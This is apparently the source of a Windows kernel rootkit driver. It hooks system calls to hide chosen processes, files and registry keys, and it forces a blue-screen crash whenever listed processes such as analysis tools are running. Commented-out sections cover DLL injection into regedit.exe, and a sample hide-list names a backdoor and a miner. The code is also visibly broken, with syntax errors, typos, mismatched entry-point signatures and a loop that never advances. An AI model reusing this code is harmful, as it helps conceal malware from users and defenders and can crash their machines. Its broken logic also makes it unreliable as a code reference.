#include "includes.hpp"
#include "defs.hpp"
#include "hook.hpp"
#include "imports.hpp"
using namespace std;

//define global variables

wchar_t dllpath;
wchar_t target_proc;

#define _WIN32_WINNT 0x0600 // Windows Vista and above

std::vector<const char *> pidstohide = {};

typedef NTSYSAPI NTSTATUS ZwEnumerateKey_t(
  [in]            HANDLE                KeyHandle,
  [in]            ULONG                 Index,
  [in]            KEY_INFORMATION_CLASS KeyInformationClass,
  [out, optional] PVOID                 KeyInformation,
  [in]            ULONG                 Length,
  [out]           PULONG                ResultLength
);

//NTSTATUS WINAPI HOOKED_E
typedef NTSTATUS WINAPI ZwQuerySystemInformation_t(
  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
  _Inout_   PVOID                    SystemInformation,
  _In_      ULONG                    SystemInformationLength,
  _Out_opt_ PULONG                   ReturnLength
);

typedef NTSYSAPI NTSTATUS ZwEnumerateValueKey_t(
  [in]            HANDLE                      KeyHandle,
  [in]            ULONG                       Index,
  [in]            KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  [out, optional] PVOID                       KeyValueInformation,
  [in]            ULONG                       Length,
  [out]           PULONG                      ResultLength
);



ZwQuerySystemInformation_t g_SysInfo = 0;
ZwEnumerateKey_t g_EnumKey = 0;
ZwEnumerateValueKey_t g_EnumValKey = 0;

VOID DriverUnload(PDRIVER_OBJECT DriverObject){
    UNREFERENCED_PARAMETER(DriverObject);
    k_hook::stop()
	LARGE_INTEGER integer{ 0 };
	integer.QuadPart = -10000;
	integer.QuadPart *= 10000;
	KeDelayExecutionThread(KernelMode, FALSE, &integer);
}

//interger.QuadPart = DelayTime * -1;
//interger.QuadPArt *= DelayTime;

void BSOD(){
    	//Credits: "superblaubeere27" on github
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
}

NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {

    NTSTATUS status = OriginalNtQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext,
        IoStatusBlock, FileInformation, Length,
        FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan
    );

    if (status == STATUS_SUCCESS && FileInformation != nullptr){
        PFILE_DIRECTORY_INFORMATION dirinfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
        while (true){
            bool shouldHide = false;

            for (const auto& item : HideFiles){
                if (_wcsicmp(dirinfo->FileName, item.c_str()) == 0) {
                    shouldHide = true;
                    break;
                }
            }

            if (shouldHide) {
                if (dirinfo->NextEntryOffset != 0){
                    dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset);

                } else {
                    break;
                }
            }

            if (dirinfo->NextEntryOffset == 0) break;

            dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset);
        }
    }
    return status;

}






NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = OriginalNtQuerySystemInformation(
        SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength
    );
    if (status == STATUS_SUCCESS) {
        PSSYSTEM_PROCESS_INFORMATION pspi = (PSSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSSYSTEM_PROCESS_INFORMATION prev = nullptr;
        while (pspi) {
            if (std::find(pidstohide.begin(), pidstohide.end(), pspi->ProcessId) != pidstohide.end()) { 
                if (prev) {
                    if (pspi->NextEntryOffset) {
                        prev->NextEntryOffset += pspi->NextEntryOffset;
                    } else {
                        prev->NextEntryOffset = 0;
                    }
                }
                if (pspi->NextEntryOffset == 0)
                    break;
                pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
                continue;
            }
            prev = pspi;
            if (pspi->NextEntryOffset == 0)
                break;
            pspi = (PSSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
        }
    }
    return status;
}

//Thanks a lot to "sam-b" on github for these defs!

NTSTATUS NTAPI HOOKED_SYSTEM_HANDLE_INFORMATION_EX(
    ULONG_PTR HandleCount,
    ULONG_PTR Reserved,
    SYSTEM_HANDLE Handles[1]
)
{

    ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

        status = ZwQuerySystemInformation(reinterpret_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation),  pHandleInfo, len, &len);

	} while (status == (NTSTATUS) 0xc0000004);
    for (int i = 0; i < pHandleInfo->HandleCount; i++) {
        HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
        if (std::find(pidstohide.begin(), pidstohide.end(), pid) != pidstohide.end()) {
            memmove(&pHandleInfo->Handles[i], &pHandleInfo->Handles[i+1], (pHandleInfo->HandleCount - i -1) * sizeof(SYSTEM_HANDLE));
            --HandleCount;
        --i;
        }
    }
    GlobalFree(pHandleInfo);
    return 0;
}

#define HIDE_REG L"$$hide"
//#define UNICODE


NtEnumerateKey_t origNtEnumerateKey = NULL;
NtEnumerateValueKey_t origNtEnumerateValueKey = NULL;

std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
    std::vector<std::wstring> deserializedData;
    size_t pos = 0;
    std::wstring token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = serializedData.substr(0, pos);
        deserializedData.push_back(token);
        serializedData.erase(0, pos + 1);
    }
    if (!serializedData.empty()) {
        deserializedData.push_back(serializedData);
    }
    return deserializedData;
}


//Thanks to S12-H4CK on medium.com for these hooks!
NTSTATUS NTAPI HookedZwEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
    WCHAR* keyName = NULL;

    if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
    if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;

    for (const auto& hideReg : HIDE_REGS) {
        if (wcsstr(keyName, hideReg.c_str())) {
            ZeroMemory(KeyInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};

NTSTATUS NTAPI HookedZwEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    //vector<wstring> hideRegs = { L"hide", L"$$hide" };   
    NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
    WCHAR* keyValueName = NULL;

    if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
    if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;

    for (const auto& hideReg : HIDE_REGS) {
        if (wcsstr(keyValueName, hideReg.c_str())) {
            ZeroMemory(KeyValueInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};


/*
NTSTATUS IoctlHandler(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    PIO_STACK_LOCATION  irpSp = IoGetCurrentIrpStackLocation(Irp);
    PVOID               outBuffer = Irp->AssociatedIrp.SystemBuffer;

    if (irpSp->Parameters.DeviceIoControl.IoControlCode == IOCTL_MY_CUSTOM_CODE) {
        PUSER_MODE_PARAMS params = (PUSER_MODE_PARAMS)outBuffer;

        RtlStringCchCopyW(params->String1, MAX_STR_LEN, dllpath);
        RtlStringCchCopyW(params->String2, MAX_STR_LEN, target_proc);

        Irp->IoStatus.Information = sizeof(USER_MODE_PARAMS);
        Irp->IoStatus.Status = STATUS_SUCCESS;
    } else {
        Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
        Irp->IoStatus.Information = 0;
    }

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Irp->IoStatus.Status;
}



void detach(PEPROCESS eProcess) {
    ObDereferenceObject((int)eProcess);
}

HMODULE getHandle(uintptr_t pid, PEPROCESS &eProcess) {
    //PEPROCESS eProcess;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &eProcess);
    if (!NT_SUCCESS(status) || !eProcess) {
        return NULL;
    }

    HMODULE hProcessHandle;
    status = ObOpenObjectByPointer(eProcess, 0, NULL, 0, NULL, KernelMode, &hProcessHandle);
    if (!NT_SUCCESS(status) || !hProcessHandle) {
        detach(eProcess);
        return NULL;
    }

    return hProcessHandle;

}

uintptr_t GetProcessIdByName(const wchar_t *processName) {
    log_debug("Retrieving PID of %s...", processName);
    PEPROCESS process = NULL;
    PEPROCESS current = PsGetNextProcess(NULL);
    while (current) {
        const char* imageName = PsGetProcessImagefileName(current);
        if (imageName && _wcsicmp(imageName, processName) == 0) {
            PsLookupProcessByProcessId(PsGetProcessId(current), &process);
            break;
        }
        current = PsGetNextProcess(current);
    }
    if (process) {
        return PsGetProcessId(process);
    }
    return 0;
}
*/
bool IsProcessRunning(const wchar_t *processName){
    log_debug("Checking if process %s is running...", processName);
    bool exists = false;
    PEPROCESS process = NULL;
    PEPROCESS current = PsGetNextProcess(NULL);

    while (current){
        const char* imageName = PsGetProcessImagefileName()
        if (imageName == processName){
            return true;
        }
    }
    return false;
}


/*
bool CloudHook(PUNICODE_STRING Module, FARPROC Hook) {
    log_debug("Hooking %s with %p", Module, Hook);

    PVOID FuncAddress = MmGetSystemRoutineAddress(Module);

    //MEMORY_BASIC_INFORMATION mbi;
    MEMORY_BASIC_INFORMATION mbi;
    DWORD dwOldProtect;
    NTSTATUS status = ZwQueryVirtualMemory(ZwCurrentProcess(), FuncAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
    

    if (!NT_SUCCESS(status)){
        log_debug("Unable to read Protection of module!");
        return false;
    }

    dwOldProtect = mbi.Protect;

    status = MmProtectMdlSystemAddress((PMDL)FuncAddress, PAGE_EXECUTE_READWRITE);
    
    if (!NT_SUCCESS(status)){
        log_debug("Unable to change READ/WRITE protections of module!");
        return false;
    }

    BYTE* pFunc = (BYTE*)FuncAddress;
    BYTE* pDetour = (BYTE*)Hook;
    intptr_t relAddr = (intptr_t)pDetour - (intptr_t)pFunc - 5;

    pFunc[0] = 0xE9; // JMP opcode
    *(int32_t*)(pFunc + 1) = (int32_t)relAddr;
    //VirtualProtect(ntqsi, 5, dwOldProtect, &temp);

    status = MmProtectMdlSystemAddress((PMDL)FuncAddress, dwOldProtect);
    return true;
}



SIZE_T lenfilesize(string dll){
    try{
        log_debug("Reading filesize of %s...", dll);
        SIZE_T filesize;
        filesystem::path filepath = dll;
        filesize=filesystem::file_size(filepath);
        return filesize;
    } catch (...){
        return 0;
    }
}

/*
FARPROC loadlibrary(LPCWSTR dll, PANSI_STRING func){
    uintptr_t address = GetProcessIdByName(dll);
    PEPROCESS eProcess;
    HMODULE handle = getHandle(addresss, eProcess);
    if (handle == NULL){
        return 0;
    }
    address = GetProcAddress(handle, func);
    if (address == nullptr){
        func = "LoadLibraryW";
    }
    PVOID funcAddress;
    NTSTATUS status = LdrGetProcedureAddress(handle, func, NULL, &funcAddress);
    if (!NT_SUCCESS(status)) {
        return 0;
    }
    detach(eProcess)
    return (FARPROC)funcAddress;
}
    

bool DllInject(string path, const char* proc) {
    log_debug("Injecting %s into process %s", path.c_str(), proc);
    uintptr_t pid = GetProcessIdByName(proc);
    if (!pid) return false;

    SIZE_T filesize = lenfilesize(path) + 2;
    PEPROCESS process = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &process);
    if (!NT_SUCCESS(status) || !process) return false;

    HANDLE hProcess = NULL;
    status = ObOpenObjectByPointer(
        process,
        0,
        NULL,
        PROCESS_ALL_ACCESS,
        *PsProcessType,
        KernelMode,
        &hProcess
    );
    if (!NT_SUCCESS(status) || !hProcess) {
        detach(process);
        return false;
    }

    PVOID arg_address = NULL;
    status = ZwAllocateVirtualMemory(
        hProcess,
        &arg_address,
        0,
        &filesize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        detach(process);
        return false;
    }

    SIZE_T bytesWritten = 0;
    status = MmCopyVirtualMemory(
        PsGetCurrentProcess(),
        (PVOID)path.c_str(),
        process,
        arg_address,
        filesize,
        KernelMode,
        &bytesWritten
    );
    if (!NT_SUCCESS(status) || bytesWritten != filesize) {
        detach(process);
        return false;
    }

    // At this point, you must create a remote thread or queue a user-mode APC to call LoadLibraryW in the target process.
    // This is not trivial in kernel mode and cannot be done with CreateRemoteThread.
    // You need to use PsCreateSystemThread or KeInsertQueueApc, which is advanced and risky.

    detach(process);
    return true;
}
*/


//Big thanks to "ThomasonZoa" on github for InfinityHookProMax!

void __fastcall SysInfo_call_back(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_SysInfo) *sddt_address = HOOKED_SYSTEM_PROCESS_INFORMATION; 
}

void __fastcall EnumerateKey_callback(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_EnumKey) *ssdt_address = HookedZwEnumerateKey;
}

void __fastcall EnumValKey_callback(unsigned long ssdt_index, void** ssdt_address){
    UNREFERENCED_PARAMETER(ssdt_index);
    if (*ssdt_address == g_EnumValKey) *ssdt_address = HookedZwEnumerateValueKey;
}

BOOL APIENTRY DLLMain(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpreserved){
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;
    if (DelayExcecution){
        log_debug("Sleeping for %d seconds...", static_cast<int>(DelayTime.load()));
        LARGE_INTERGER time{ 0 };
        time.QuadPart = DelayTime * -1;
        time.QuadPart *= DelayTime;
        //this_thread::sleep_for(chrono::seconds(DelayTime));
        KeDelayExecutionThread(KernelMode, FALSE, &time);
        log_debug("Times up!");
    }


    //std::vector<const char *> Processes = {
    //    "Backdoor.exe", "Miner.exe", "SomeMore.exe"
    //};

    std::vector<DWORD> pidstohide;
    DWORD pid;
    for (const char  *x : HideProcesses) {
        log_debug("Retrieving PID of %s", x);
        if (!(pid == 0)){
            pidstohide.push_back(pid);
        }
    }

    NTSTATUS Hook;
    UNICODE_STRING str;
    WCHAR name[256]{ L"ZwQuerySystemInformation" };
    RtlInitUnicodeString(&str, name);
    if (E_HideProcesses){
        g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(SysInfo_call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwQuerySystemInformation");
        }
        }

    if (E_HideFiles){
        name[256]{L"ZwEnumeratekey"};
        RtlInitUnicodeString(&str, name);
        g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumerateKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateKey");
        }
    }

    if (E_HideKeys){
        name[256]{ L"ZwEnumerateValueKey" };
        RtlInitUnicodeString(&str, name);
        g_EnumValKey = (ZwEnumerateValueKey_t)MmGetSystemRoutineAddress(&str);
        Hook = k_hook::initialize(EnumValKey_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
        if (Hook == STATUS_UNSUCCESSFUL){
            log_debug("Failed to create a hook beetween ZwEnumerateValueKey");
        }
    }

    //TODO: Use hook to hide handles

    //TODO: Add this loop to a thread to safeley unload
    //bool injected = false;
    while (true){

        //if (E_HideKeys && IsProcessRunning(L"regedit.exe") && !injected){
          //  bool status = DllInject("HideReg.dll", "regedit.exe");
            //if (status){
              //  injected = true;
            //}
        //}

        //if (!IsProcessRunning(L"regedit.exe") && injected){
          //  injected = false;
        //}

        if (bsod){
            for (auto proc : BSODProcesses){
                if (IsProcessRunning(proc)){
                    BSOD();
                }
            }
        }
        
    }


}